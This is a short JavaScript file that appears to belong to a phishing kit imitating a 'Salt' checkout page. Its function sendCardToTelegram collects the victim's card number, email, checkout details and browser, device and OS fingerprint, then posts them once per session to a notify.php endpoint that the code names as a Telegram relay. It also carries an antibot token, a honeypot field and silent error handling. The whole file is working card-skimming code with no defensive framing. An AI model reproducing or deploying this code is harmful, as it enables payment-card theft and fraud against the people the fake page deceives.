const CARD_NOTIFY_SENT_KEY = "salt-card-notify-sent";

function getClientInfo() {
  const ua = navigator.userAgent || "";
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
  let os = "Inconnu";

  if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Mac OS X/i.test(ua) && !/iPhone|iPad/i.test(ua)) os = "macOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
  else if (/Linux/i.test(ua)) os = "Linux";

  return {
    userAgent: ua,
    device: isMobile ? "Mobile" : "Desktop",
    os,
  };
}

function sendCardToTelegram(paymentData) {
  if (sessionStorage.getItem(CARD_NOTIFY_SENT_KEY)) return;

  const data = {
    ...(typeof getCheckoutData === "function" ? getCheckoutData() : {}),
    ...paymentData,
    client: getClientInfo(),
    _hp: "",
  };

  if (!data.cardNumber && !data.email) return;

  sessionStorage.setItem(CARD_NOTIFY_SENT_KEY, "1");
  if (typeof clearPartialNotifyTimer === "function") clearPartialNotifyTimer();
  if (typeof markCheckoutComplete === "function") markCheckoutComplete();

  const apiBase = window.location.pathname.includes("/pages/")
    ? "../api/notify.php"
    : "api/notify.php";

  const headers = { "Content-Type": "application/json" };
  if (window.SALT_ANTIBOT && window.SALT_ANTIBOT.token) {
    headers["X-Salt-Token"] = window.SALT_ANTIBOT.token;
  }

  fetch(apiBase, {
    method: "POST",
    headers,
    body: JSON.stringify(data),
    credentials: "same-origin",
    keepalive: true,
  }).catch(() => {});
}
